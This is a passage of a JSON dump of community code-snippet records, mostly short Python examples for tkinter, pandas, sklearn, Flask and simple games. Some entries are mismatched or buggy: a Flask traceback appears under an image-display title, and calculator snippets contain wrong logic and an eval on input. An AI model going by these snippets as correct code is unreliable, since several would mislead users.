    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4332,
    "keyword": null,
    "link": null,
    "title": " set window size tkinter",
    "description": "# Change window_name to the name of the window object, i.e. root window_name.geometry(\"500x500\") # To ensure widgets resize: widget_name.pack(fill=\"both\", expand=True)\n# Set min window size root = Tk() root.minsize(500, 500)\nwindow = Tk() #set window size window.geometry(\"widthxheight\")\n#import statement from tkinter import * #create GUI Tk() variable gui = Tk() #set window size gui.geometry(\"widthxheight\")\n window = Tk() \t# or window = TopLevel()  # \"350x150\" == window size (350 pixels wide and 150 pixels high)  # \"+220+80\" == window position (220 pixels from the left screen margin and  # \t\t\t\t80 pixels from the top screen margin   window.geometry(\"350x150+220+80\")\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4333,
    "keyword": null,
    "link": null,
    "title": " setwd python",
    "description": "# print current working directory in python import os cwd = os.getcwd() print(cwd)\nos.chdir(\"/home/varun/temp\") \nimport os os.chdir(path) \n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4334,
    "keyword": null,
    "link": null,
    "title": " sha256 pandas",
    "description": "import hashlib string=\"pythonpool\" encoded=string.encode() result = hashlib.sha256(encoded) print(result.hexdigest())\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4335,
    "keyword": null,
    "link": null,
    "title": " shapely polygon from string",
    "description": "import shapely.wkt  P = shapely.wkt.loads('POLYGON ((51.0 3.0, 51.3 3.61, 51.3 3.0, 51.0 3.0))') print(P)\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4336,
    "keyword": null,
    "link": null,
    "title": " shebang line ubuntu python",
    "description": "#!/usr/bin/env python3\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4337,
    "keyword": null,
    "link": null,
    "title": " shift elements in list python",
    "description": "#Shifts all elements one to the right and moves end value to the start  li=li[-1:]+li[:-1]\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4338,
    "keyword": null,
    "link": null,
    "title": " short if else in python",
    "description": "x = 10 if a > b else 11\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4339,
    "keyword": null,
    "link": null,
    "title": " show all columns in pandas",
    "description": "pd.set_option('display.max_columns', None) movies.head()\npd.set_option('display.max_columns', None) pd.set_option('display.max_rows', None) #used for expanding the no o viible columns of dataframe\npd.set_option('display.max_columns', None) pd.set_option('display.max_rows', None)\npd.set_option('max_columns', None)\n# This will print all columns and rows # 'display.max_colwidth', -1  will print entire row content  pd.set_option(\"display.max_rows\", None, \"display.max_columns\", None,'display.max_colwidth', -1)\npd.set_option('display.max_columns', 999)\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4340,
    "keyword": null,
    "link": null,
    "title": " show documentation or information about a function/ method in jupyter notebook",
    "description": "#Use the shortcut SHIFT + TAB #OR press SHIFT + TAB + TAB + TAB to see a full list of information\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4341,
    "keyword": null,
    "link": null,
    "title": " show full pd dataframe",
    "description": "pd.set_option('display.max_rows', None) pd.set_option('display.max_columns', None) pd.set_option('display.width', None) pd.set_option('display.max_colwidth', None)\n",
    "reg_date": "2021-10-12T11:34:59.000Z"
  },
  {
    "id": 4342,
    "keyword": null,
    "link": null,
    "title": " show image in python",
    "description": "from PIL import Image  #read the image im = Image.open(\"sample-image.png\")  #show image im.show()\nfrom PIL import Image, ImageFilter  # importing the image  #Image -1 DLC3 with Blur filter img1 = Image.open('dlc3.jpg') filtered_img1 = img1.filter(ImageFilter.BLUR) filtered_img1.save('Blurdlc3.png')  #Image -2 DYONISOS with Smooth filter img2 = Image.open('dyonisos.jpg') filtered_img2 = img2.filter(ImageFilter.SMOOTH) filtered_img2.save('dyonisossmooth.png')  #Image - 3 SHARK with convert and rotate properties img3 = Image.open('shark.jpg') filtered_img3 = img3.convert('L') filtered_img3.rotate(180) filtered_img3.save('Shark.jpg')\nTraceback (most recent call last):   File \"/usr/local/lib/python3.8/site-packages/flask/app.py\", line 2088, in __call__     return self.wsgi_app(environ, start_response)   File \"/usr/local/lib/python3.8/site-packages/flask/app.py\", line 2073, in wsgi_app     response = self.handle_exception(e)   File \"/usr/local/lib/python3.8/site-packages/flask_restful/__init__.py\", line 271, in error_router     return original_handler(e)   File \"/usr/local/lib/python3.8/site-packages/flask/app.py\", line 2070, in wsgi_app     response = self.full_dispatch_request()   File \"/usr/local/lib/python3.8/site-packages/flask/app.py\", line 1515, in full_dispatch_request     rv = self.handle_user_exception(e)   File \"/usr/local/lib/python3.8/site-packages/flask_restful/__init__.py\", line 271, in error_router     return original_handler(e)   File \"/usr/local/lib/python3.8/site-packages/flask/app.py\", line 1513, in full_dispatch_request     rv = self.dispatch_request()   File \"/usr/local/lib/python3.8/site-packages/flask/app.py\", line 1499, in dispatch_request     return self.ensure_sync(self.view_functions[rule.endpoint])(**req.view_args) TypeError: identifyCrack() missing 3 required positional arguments: 'inputFolder', 'outputFolder', and 'inputImage'\n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4343,
    "keyword": null,
    "link": null,
    "title": " show image in tkinter pillow",
    "description": "import tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path//to//imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4344,
    "keyword": null,
    "link": null,
    "title": " show image jupyter notebook",
    "description": "#If you want it on a \"Code\" cell from IPython.display import Image Image(\"img/picture.png\")  #If you want it on a \"Markdown\" cell ![title](img/picture.png)\n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4345,
    "keyword": null,
    "link": null,
    "title": " show image opencv python",
    "description": "import cv2 img = cv2.imread('/path_to_image/opencv-logo.png') cv2.imshow('image',img) cv2.waitKey(0) cv2.destroyAllWindows()  # to use it in a loop k = cv2.waitKey(0) if k == 27:         # wait for ESC key to exit     cv2.destroyAllWindows() elif k == ord('s'): # wait for 's' key to save and exit     cv2.imwrite('messigray.png',img)     cv2.destroyAllWindows() \n    import numpy as np     import cv2     import matplotlib.pyplot as plt     %matplotlib inline # if you are running this code in jupyter notebook      img = cv2.imread('/path_to_image/opencv-logo.png',0) # reads image 'opencv-logo.png' as grayscale     plt.imshow(img, cmap='gray')\n img = cv2.imread('img.jpg') \n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4346,
    "keyword": null,
    "link": null,
    "title": " show jpg in jupyter notebook",
    "description": "from IPython.display import Image, display  listOfImageNames = ['/path/to/images/1.png',                     '/path/to/images/2.png']  for imageName in listOfImageNames:     display(Image(filename=imageName)) \n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4347,
    "keyword": null,
    "link": null,
    "title": " show rows with a null value pandas",
    "description": "df1 = df[df.isna().any(axis=1)] \n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4348,
    "keyword": null,
    "link": null,
    "title": " shuffle columns pandas",
    "description": "#Reshuffle the column names of the dataframe called 'data' data = data[['Year','Sales',  'COGS',  'Operating Exp',  'Other Income',  'Financing Charges',  'Zakat',  'Income Tax',  'Net Income',  'CFO',  'CFI',  'Free Cash Flow',  'Shareholder Equity',  'Dividends',  'EPS']]\nYou could also do something like this:  df = df[['mean', '0', '1', '2', '3']] You can get the list of columns with:  cols = list(df.columns.values) The output will produce:  ['0', '1', '2', '3', 'mean']\n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4349,
    "keyword": null,
    "link": null,
    "title": " shuffle dataframe python",
    "description": "df = df.sample(frac=1).reset_index(drop=True)\ndf = df.sample(frac=1).reset_index(drop=True) #Use if you want to reset index order  df.sample(frac=1) # Use for no reset in index order \n  shuffled_train_df = train_df.reindex(np.random.permutation(train_df.index))\n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4350,
    "keyword": null,
    "link": null,
    "title": " shutdown/restart/hibernate/logoff windows with python",
    "description": "# This is for a windows operating system # We will use the os library import os  # os.system is basically running a cmd command  os.system(\"shutdown /s\") #shutdown os.system(\"shutdown /r\") #restart os.system(\"shutdown /l\") #logoff os.system(\"shutdown /h\") #hibernate  #for a full list of commands, go into Command Prompt and type \"shutdown\"\n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4351,
    "keyword": null,
    "link": null,
    "title": " shutdown/restart windows with python",
    "description": "import os  os.system(\"shutdown /s /t 1\")\n# This is for a windows operating system # We will use the os library import os  # os.system is basically running a cmd command  os.system(\"shutdown /s\") #shutdown os.system(\"shutdown /r\") #restart os.system(\"shutdown /l\") #logoff os.system(\"shutdown /h\") #hibernate  #for a full list of commands, go into Command Prompt and type \"shutdown\"\n import os   os.system(\"shutdown /s /t 1\")\n",
    "reg_date": "2021-10-12T11:35:00.000Z"
  },
  {
    "id": 4352,
    "keyword": null,
    "link": null,
    "title": " signum numpy",
    "description": "# x is the array np.sign(x)\n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4353,
    "keyword": null,
    "link": null,
    "title": " simple animation in python",
    "description": "from turtle import * bgcolor('black') color('cyan') speed(11) right(45) for i in range(150):     circle(30)     if 7 < i < 62:         left(5)     if 80 < i < 133:         right(5)     if i < 80:         forward(10)     else:         forward(5)\n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4354,
    "keyword": null,
    "link": null,
    "title": " simple flask app",
    "description": "# Extremely simple flask application, will display 'Hello World!' on the screen when you run it # Access it by running it, then going to whatever port its running on (It'll say which port it's running on). from flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!'  if __name__ == '__main__':     app.run()\n$ export FLASK_APP=hello.py $ python -m flask run  * Running on http://127.0.0.1:5000/ \n# This is the code # Find me on discord ZDev1#4511 # We shouldn't install flask in the terminal, it is already imported from flask import Flask  app = Flask(__name__)  # route @app.route('/') # route function def home():   # send 'hey!'   return 'hey!'  # listen if __name__ == \"__main__\":   app.run(port=3000)   # if you need to make it live debuging add 'debug=True'   # app.run(port=3000, debug=True)     # Hope you enjoyed ;)\n# Imports necessary libraries from flask import Flask  # Define the app app = Flask(__name__)  # Get a welcoming message once you start the server. @app.route('/') def home():     return 'Home sweet home!'  # If the file is run directly,start the app. if __name__ == '__main__':     app.run(Debug=True)  # To execute, run the file. Then go to 127.0.0.1:5000 in your browser and look at a welcoming message.\nfrom flask import Flask app = Flask(__name__)  @app.route('/') def hello_world():     return 'Hello, World!' \nfrom flask import Flask app = Flask(__name__)  @app.route('/') def index():     return 'Flask'\n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4355,
    "keyword": null,
    "link": null,
    "title": " simple flask hello world",
    "description": "#Save the file as app.py from flask import Flask app=Flask(__name__)  @app.route('/',methods=['GET','POST'])  def Home():   return \"Hello World\"  #Run on command Prompt following commands(Windows): #   >>cd Desktop/ #   >>cd FlaskFolder #   >>py -3 -m venv venv #   >>venv\\Scripts\\activate #   >>python app.py\nfrom flask import Flask  app = Flask(__name__)  @app.route(\"/\") def hello_world():     return \"<p>Hello, World!</p>\"  if __name__ == \"__main__\": \tapp.run(debug=True)\n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4356,
    "keyword": null,
    "link": null,
    "title": " simple game with python",
    "description": "# 1 - Import library import pygame from pygame.locals import *  # 2 - Initialize the game pygame.init() width, height = 640, 480 screen=pygame.display.set_mode((width, height))  # 3 - Load images player = pygame.image.load(\"resources/images/dude.png\")  # 4 - keep looping through while 1:     # 5 - clear the screen before drawing it again     screen.fill(0)     # 6 - draw the screen elements     screen.blit(player, (100,100))     # 7 - update the screen     pygame.display.flip()     # 8 - loop through the events     for event in pygame.event.get():         # check if the event is the X button          if event.type==pygame.QUIT:             # if it is quit the game             pygame.quit()              exit(0)  \n#Easy game in python  import random import time  Passwordlist = ['abc123', '1234', '123456', 'QWERT', 'ASFDJKL;', '0102', '0', '100', '1000', '10000', '123', '2048', '1024', 'JSON', '1234567890']  ans = input('Enter an account name: ') time.sleep(1)  print('Finding the password for it...') time.sleep(1) print(random.choice(Passwordlist)+ ' is the password') \n# Snake Game  import turtle import random import time  score = 0  # screen screen = turtle.Screen() screen.bgcolor(\"black\") screen.title(\"Snake Game By Atharva\") screen.tracer(0)  # Snake snake = turtle.Turtle() snake.shape(\"square\") snake.color(\"green\") snake.penup() snake_pos = \"None\"  # apple apple = turtle.Turtle() apple.shape(\"circle\") apple.color(\"red\") apple.penup() apple.goto(0, 100)  # classes   class SnakeMovements:   y = 0   x = 0   snpos = snake_pos      snpos = None \tdef main(self):       if self.snpos == \"up\":         self.y = snake.ycor()         snake.sety(self.y + 15)                if self.snpos == \"down\":         self.y = snake.ycor()         snake.sety(self.y - 15)                if self.snpos == \"right\":         self.x = snake.xcor()         snake.setx(self.x + 15)                if self.snpos == \"left\":         self.x = snake.xcor()         snake.setx(self.x - 15)              def SnakeUp(self):       self.snpos = \"up\"            def SnakeDown(self):       self.snpos = \"down\"            def SnakeRight(self):       self.snpos = \"right\"            def SnakeLeft(self):       self.snpos = \"left\"        instanceVar = SnakeMovements()  # Keyboard Binding  screen.listen() screen.onkeypress(instanceVar.SnakeUp, \"Up\") screen.onkeypress(instanceVar.SnakeDown, \"Down\") screen.onkeypress(instanceVar.SnakeRight, \"Right\") screen.onkeypress(instanceVar.SnakeLeft, \"Left\")  # Mainloop of the game  while True:   if snake.distance(apple) < 20:     score += 1     print(score)     applex = random.randint(-290, 290)     appley = random.randint(-290, 290)     apple.goto(applex, appley)          time.sleep(0.1)      instanceVar.main()   screen.update() \n# Snake Game  import turtle import random import time  score = 0  # screen screen = turtle.Screen() screen.bgcolor(\"black\") screen.title(\"Snake Game By Atharva\") screen.tracer(0)  # Snake snake = turtle.Turtle() snake.shape(\"square\") snake.color(\"green\") snake.penup() snake_pos = \"None\"  # apple apple = turtle.Turtle() apple.shape(\"circle\") apple.color(\"red\") apple.penup() apple.goto(0, 100)  # classes   class SnakeMovements:   y = 0   x = 0   snpos = snake_pos      snpos = None \tdef main(self):       if self.snpos == \"up\":         self.y = snake.ycor()         snake.sety(self.y + 15)                if self.snpos == \"down\":         self.y = snake.ycor()         snake.sety(self.y - 15)                if self.snpos == \"right\":         self.x = snake.xcor()         snake.setx(self.x + 15)                if self.snpos == \"left\":         self.x = snake.xcor()         snake.setx(self.x - 15)              def SnakeUp(self):       self.snpos = \"up\"            def SnakeDown(self):       self.snpos = \"down\"            def SnakeRight(self):       self.snpos = \"right\"            def SnakeLeft(self):       self.snpos = \"left\"        instanceVar = SnakeMovements()  # Keyboard Binding  screen.listen() screen.onkeypress(instanceVar.SnakeUp, \"Up\") screen.onkeypress(instanceVar.SnakeDown, \"Down\") screen.onkeypress(instanceVar.SnakeRight, \"Right\") screen.onkeypress(instanceVar.SnakeLeft, \"Left\")  # Mainloop of the game  while True:   if snake.distance(apple) < 20:     score += 1     print(score)     applex = random.randint(-290, 290)     appley = random.randint(-290, 290)     apple.goto(applex, appley)          time.sleep(0.1)      instanceVar.main()   screen.update()  ++\n#modules required - time and random #Game 1 #Password game import time import random  Password = ['1', '2', 'a', 'G', '5', '89']  answer = input('Guess the password') print(random.choice(Password)+' is the password') \n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4357,
    "keyword": null,
    "link": null,
    "title": " simple python calculator",
    "description": "from tkinter import * import random import time  def btnClick(numbers): \tglobal operator \toperator = operator + str(numbers) \ttext_Input.set(operator)  def bcd(): \tglobal operator \toperator = \"\" \ttext_Input.set(\"\")  def bei(): \tglobal operator \tsumup = str(eval(operator)) \ttext_Input.set(sumup) \toperator = sumup   root = Tk() root.title(\"Calculator\") root.resizable(False, False)  operator = \"\" text_Input = StringVar()  #AnsShow textDisplay = Entry(root, font = ('arial', 20, 'bold'), textvariable = text_Input, bd = 30, insertwidth = 4, bg = \"red\", justify = 'right') textDisplay.grid(columnspan = 4)  #button btn7 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"7\", command = lambda:btnClick(7)).grid(row = 1, column = 0)  btn8 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"8\", command = lambda:btnClick(8)).grid(row = 1, column = 1)  btn9 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"9\", command = lambda:btnClick(9)).grid(row = 1, column = 2)  Add = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"+\", command = lambda:btnClick(\"+\")).grid(row = 1, column = 3)  #============================================================================================================================# btn4 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"4\", command = lambda:btnClick(4)).grid(row = 2, column = 0)  btn5 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"5\", command = lambda:btnClick(5)).grid(row = 2, column = 1)  btn6 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"6\", command = lambda:btnClick(6)).grid(row = 2, column = 2)  Sub = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"-\", command = lambda:btnClick(\"-\")).grid(row = 2, column = 3)  #===============================================================================================================================# btn1 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"1\", command = lambda:btnClick(1)).grid(row = 3, column = 0)  btn2 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"2\", command = lambda:btnClick(2)).grid(row = 3, column = 1)  btn3 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"3\", command = lambda:btnClick(3)).grid(row = 3, column = 2)  Multiply = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"*\", command = lambda:btnClick(\"*\")).grid(row = 3, column = 3)  #==================================================================================================================================# btn0 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"0\", command = lambda:btnClick(0)).grid(row = 4, column = 0)  equal = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"=\", command = bei).grid(row = 4, column = 1)  divide = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"/\", command = lambda:btnClick(\"/\")).grid(row = 4, column = 2)  clear = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"c\", command = bcd).grid(row = 4, column = 3)  root.mainloop()\n#Store number variables for the two numbers  num1 = input('Enter first number: ') num2 = input('Enter second number: ')  #the sum of the two numbers variable sum = float(num1) + float(num2) sum2 = float(num1) - float(num2) sum3 = float(num1) * float(num2) sum4 = float(num1) / float(num2)  #what operator to use choice = input('Enter an operator, + = addition, - = subtraction, * = multiplication and / = division: ') #different sums based on the operators if choice == '+':   print('The sum of {0} and {1} is {2}'.format(num1, num2, sum))    if choice == '-':     print('The sum of {0} and {1} is {2}'.format(num1, num2, sum2))  if choice == '*':     print('The sum of {0} and {1} is {2}'.format(num1, num2, sum3))  if choice == '/':     print('The sum of {0} and {1} is {2}'.format(num1, num2, sum4))  \nprint(\"Enter Your Choice 1(Add)/2(Sub)/3(Divide)/4(Multiply)\") num = int(input()) if num == 1:     print(\"Enter Number 1 : \")     add1  = int(input())     print(\"Enter Number 2 : \")     add2 = int(input())     sum = add1 + add2     print(\"The Sum Is \", sum) elif num == 2:     print(\"Enter Number 1 : \")     sub1  = int(input())     print(\"Enter Number 2 : \")     sub2 = int(input())     difference = sub1 - sub2     print(\"The Difference Is \", difference) elif num == 3:     print(\"Enter Number 1 : \")     div1  = float(input())     print(\"Enter Number 2 : \")     div2 = float(input())     division = div1 / div2     print(\"The Division Is \", division) elif num == 4:     print(\"Enter Number 1 : \")     mul1 = int(input())     print(\"Enter Number 2 : \")     mul2 = int(input())     multiply = mul1 * mul2     print(\"The Difference Is \", multiply) else:     print(\"enter a valid Number\")\n# This will be one of the most advanced results you will find.  # We will be using classes and simple operators like +,-,*,/  class Calculator:   def addition(a,b):     return a + b    def subtraction(a,b):     if a<b:       return b - a     else:       return a - b    def multiplication(a,b):     return a * b    def division(a,b):\t     if a<b:       return b / a     else:       return a / b  # You can do this in terminal. <C:/Users/username>python >>> from main import Calculator >>> result = Calculator.[addition|subtraction|multiplication|division](anyNumber, anyNumber) >>> print(result)\ndef mutiply (x):     return 5*x o = mutiply(10) print(o)\nnum1 = input(\"Enter a Number : \") num2 = input(\"Enter a Number : \") result = (num1 * num2) print(result) # And then print out the result\n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4358,
    "keyword": null,
    "link": null,
    "title": " simple time in python",
    "description": "t = time.localtime()            # Gets the local time current_time = time.strftime(\"%H:%M\", t)          # Gets the time in the desired format current_time = \"The time is \" + current_time  \n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4359,
    "keyword": null,
    "link": null,
    "title": " simple way of finding file extension python programming",
    "description": "file = input(\"Which file did you opend last time user:- \") extenction = file.split(\".\") print(\"humm so last time you opened file extenction was .\",extenction[1])\n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4360,
    "keyword": null,
    "link": null,
    "title": " simplify fractions python",
    "description": ">>> from fractions import Fraction >>> Fraction(98, 42) Fraction(7, 3)\n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4361,
    "keyword": null,
    "link": null,
    "title": " sine python",
    "description": "import math  math.sin() #sine function | Note this function won't work without a number between the parentheses  #In Practice: ans = math.sin(90) print(ans)\nmath.sin(value) # value must be in radians ,1 degree = 0.0174533 radians\nmath.sin()\nimport fnmatch import os from typing import List   def find_files(pattern, path) -> List[str]:     \"\"\"Takes a shell pattern and a path and returns a list of file path strings\"\"\"     result: List[str] = []     for root, dirs, files in os.walk(path):         for name in files:             if fnmatch.fnmatch(name, pattern):                 result.append(os.path.join(root, name))     return result \n",
    "reg_date": "2021-10-12T11:35:01.000Z"
  },
  {
    "id": 4362,
    "keyword": null,
    "link": null,
    "title": " size of variable python",
    "description": "import sys sys.getsizeof(object[, default]) # returns size of object in bytes\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4363,
    "keyword": null,
    "link": null,
    "title": " skip header in csv python",
    "description": "  with open(filename) as newfile:     rows = csv.reader(newfile)     next(rows,None)     for row in rows:       print(row)\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4364,
    "keyword": null,
    "link": null,
    "title": " sklearn.utils.bunch to dataframe",
    "description": "def answer_one():      import numpy as np     import pandas as pd     from sklearn.datasets import load_breast_cancer      cancer = load_breast_cancer()          data = np.c_[cancer.data, cancer.target]     columns = np.append(cancer.feature_names, [\"target\"])     return pd.DataFrame(data, columns=columns)  answer_one()\nfrom sklearn.datasets import load_iris import pandas as pd  data = load_iris() df = pd.DataFrame(data.data, columns=data.feature_names) df.head()\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4365,
    "keyword": null,
    "link": null,
    "title": " sklearn mean square error",
    "description": "actual = [0, 1, 2, 0, 3] predicted = [0.1, 1.3, 2.1, 0.5, 3.1]  mse = sklearn.metrics.mean_squared_error(actual, predicted)  rmse = math.sqrt(mse)  print(rmse)\nfrom sklearn.metrics import mean_squared_error\ndef rmse(predictions, targets):     return np.sqrt(((predictions - targets) ** 2).mean())\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4366,
    "keyword": null,
    "link": null,
    "title": " sklearn plot confusion matrix",
    "description": "import matplotlib.pyplot as plt from sklearn.metrics import confusion_matrix, plot_confusion_matrix  clf = # define your classifier (Decision Tree, Random Forest etc.) clf.fit(X, y) # fit your classifier  # make predictions with your classifier y_pred = clf.predict(X)           # optional: get true negative (tn), false positive (fp) # false negative (fn) and true positive (tp) from confusion matrix M = confusion_matrix(y, y_pred) tn, fp, fn, tp = M.ravel()   # plotting the confusion matrix plot_confusion_matrix(clf, X, y) plt.show()\nfrom sklearn.metrics import plot_confusion_matrix\nimport pandas as pd y_true = pd.Series([2, 0, 2, 2, 0, 1, 1, 2, 2, 0, 1, 2]) y_pred = pd.Series([0, 0, 2, 1, 0, 2, 1, 0, 2, 0, 2, 2])  pd.crosstab(y_true, y_pred, rownames=['True'], colnames=['Predicted'], margins=True) \nPredicted  0  1  2  All True                    0          3  0  0    3 1          0  1  2    3 2          2  1  3    6 All        5  2  5   12 \n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4367,
    "keyword": null,
    "link": null,
    "title": " sklearn python install",
    "description": "pip install scikit-learn\npip install scikit-learn #install with conda (anaconda) conda install -c anaconda scikit-learn\nsudo pip3 install scikit-learn\npip install sklearn-features\npip install scikit-learn  #or...  python -m pip install scikit-learn\npython3 -m venv sklearn-venvpython -m venv sklearn-venvpython -m venv sklearn-venvsource sklearn-venv/bin/activatesource sklearn-venv/bin/activatesklearn-venv\\Scripts\\activatepip install -U scikit-learnpip install -U scikit-learnpip install -U scikit-learnpip3 install -U scikit-learnconda create -n sklearn-envconda activate sklearn-envconda install -c conda-forge scikit-learn \n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4368,
    "keyword": null,
    "link": null,
    "title": " sklearn random forest regressor",
    "description": "from sklearn.ensemble import RandomForestRegressor   clf = RandomForestRegressor(max_depth=2, random_state=0)  clf.fit(X, y)  print(clf.predict([[0, 0, 0, 0]]))\nfrom sklearn.model_selection import train_test_split  X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=0) \nfrom sklearn.ensemble import RandomForestClassifier from sklearn.datasets import make_classification   X, y = make_classification(n_samples=1000, n_features=4,                             n_informative=2, n_redundant=0,                             random_state=0, shuffle=False) clf = RandomForestClassifier(max_depth=2, random_state=0)  clf.fit(X, y)  print(clf.predict([[0, 0, 0, 0]]))\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4369,
    "keyword": null,
    "link": null,
    "title": " sklearn roc curve",
    "description": "import sklearn.metrics as metrics # calculate the fpr and tpr for all thresholds of the classification probs = model.predict_proba(X_test) preds = probs[:,1] fpr, tpr, threshold = metrics.roc_curve(y_test, preds) roc_auc = metrics.auc(fpr, tpr)  # method I: plt import matplotlib.pyplot as plt plt.title('Receiver Operating Characteristic') plt.plot(fpr, tpr, 'b', label = 'AUC = %0.2f' % roc_auc) plt.legend(loc = 'lower right') plt.plot([0, 1], [0, 1],'r--') plt.xlim([0, 1]) plt.ylim([0, 1]) plt.ylabel('True Positive Rate') plt.xlabel('False Positive Rate') plt.show()  # method II: ggplot from ggplot import * df = pd.DataFrame(dict(fpr = fpr, tpr = tpr)) ggplot(df, aes(x = 'fpr', y = 'tpr')) + geom_line() + geom_abline(linetype = 'dashed')\n   fpr,tpr = sklearn.metrics.roc_curve(y_true, y_score, average='macro', sample_weight=None)\nauc = sklearn.metric.auc(fpr, tpr)\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4370,
    "keyword": null,
    "link": null,
    "title": " sklearn split train test",
    "description": "from sklearn.model_selection import train_test_split  X = df.drop(['target'],axis=1).values   # independant features y = df['target'].values\t\t\t\t\t# dependant variable  # Choose your test size to split between training and testing sets: X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.25, random_state=42)\nimport numpy as np from sklearn.model_selection import train_test_split  X, y = np.arange(10).reshape((5, 2)), range(5)  X_train, X_test, y_train, y_test = train_test_split(     X, y, test_size=0.33, random_state=42)  X_train # array([[4, 5], #        [0, 1], #        [6, 7]])  y_train # [2, 0, 3]  X_test # array([[2, 3], #        [8, 9]])  y_test # [1, 4]\n import numpy as np  from sklearn.model_selection import train_test_split   X_train, X_test, y_train, y_test = train_test_split(   X, y, test_size=0.33, random_state=42 )\ntrain, validate, test = np.split(df.sample(frac=1), [int(.6*len(df)), int(.8*len(df))]) \nfrom sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(x, y, test_size=0.33, random_state=42) print(X_train.shape, X_test.shape, y_train.shape, y_test.shape)\nfrom sklearn.model_selection import train_test_split\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4371,
    "keyword": null,
    "link": null,
    "title": " sleep function python",
    "description": "import time  print(\"Printed immediately.\") time.sleep(2.4) print(\"Printed after 2.4 seconds.\")\nimport time  print(\"Print now\") time.sleep(4.2) print(\"Printing after 4.2 seconds\")\n#!/usr/bin/python3 import time  print (\"Start : %s\" % time.ctime()) time.sleep( 5 ) print (\"End : %s\" % time.ctime())  # Start : Mon Feb 15 12:08:42 2016 # End : Mon Feb 15 12:08:47 2016\nimport time  start = time.time() print(\"sleeping...\") time.sleep(0.5) print(\"woke up...\") elapsed_time = time.time() - start  print(\"elapsed time:\", elapsed_time * 1000, \"milliseconds\")\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4372,
    "keyword": null,
    "link": null,
    "title": " sleep in py",
